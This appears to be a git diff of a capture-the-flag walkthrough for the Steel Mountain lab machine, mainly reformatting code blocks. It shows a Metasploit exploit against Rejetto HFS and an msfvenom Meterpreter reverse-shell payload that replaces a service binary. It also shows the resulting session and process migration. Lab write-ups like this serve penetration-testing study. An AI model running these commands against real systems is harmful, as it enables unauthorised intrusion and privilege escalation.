@@ -30,16 +30,16 @@ Configure the required options:
 
 Example:
 
-`msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.114.171.60
-RHOSTS => 10.114.171.60
+`msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.114.171.60`
+`RHOSTS => 10.114.171.60`
 
-msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
-RPORT => 8080
+`msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080`
+`RPORT => 8080`
 
-msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.234.6
-LHOST => 192.168.234.6
+`msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.234.6`
+`LHOST => 192.168.234.6`
 
-msf exploit(windows/http/rejetto_hfs_exec) > run`
+`msf exploit(windows/http/rejetto_hfs_exec) > run`
 
 ![image](images/mfsconsole.png)
 
@@ -122,7 +122,7 @@ We generate a Meterpreter reverse shell payload using msfvenom:
 
 Example:
 
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.234.6 LPORT=4646 -e x86/shikata_ga_nai -f exe > ASCService.exe`
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4646 -e x86/shikata_ga_nai -f exe > ASCService.exe`
 
 <em><strong>
 The executable must be named ASCService.exe so it replaces the original binary.
@@ -141,10 +141,10 @@ Navigate to the vulnerable service directory:
 
 Attempting to upload the payload immediately fails because the service is still running.
 
-`meterpreter > upload ~/Desktop/HTB/Machines/SteelMountain/ASCService.exe
+`meterpreter > upload ~/Desktop/HTB/Machines/SteelMountain/ASCService.exe`
 
-[-] core_channel_open: Operation failed:
-The process cannot access the file because it is being used by another process.`
+`[-] core_channel_open: Operation failed:`
+`The process cannot access the file because it is being used by another process.`
 
 <h3>Stopping the Service</h3>
 
@@ -190,8 +190,8 @@ Back in the shell, restart the vulnerable service.
 
 Once the service starts, the payload executes and we receive a new Meterpreter session.
 
-`[*] Started reverse TCP handler on 192.168.234.6:4646
-[*] Sending stage (177734 bytes) to 10.114.176.68`
+`[*] Started reverse TCP handler on <ip>:4646`
+`[*] Sending stage (177734 bytes) to 10.114.176.68`
 
 <h3>Migrating the Process</h3>
 
@@ -203,12 +203,12 @@ To stabilize the session, we immediately migrate into another process:
 
 Example output:
 
-`[*] Running module against STEELMOUNTAIN (10.114.166.2)
-[*] Current server process: ASCService.exe (3464)
-[*] Spawning notepad.exe process to migrate into
-[*] Spoofing PPID 0
-[*] Migrating into 3240
-[+] Successfully migrated into process 3240`
+`[*] Running module against STEELMOUNTAIN (10.114.166.2)`
+`[*] Current server process: ASCService.exe (3464)`
+`[*] Spawning notepad.exe process to migrate into`
+`[*] Spoofing PPID 0`
+`[*] Migrating into 3240`
+`[+] Successfully migrated into process 3240`
 
 ![image](images/migrate.png)
 
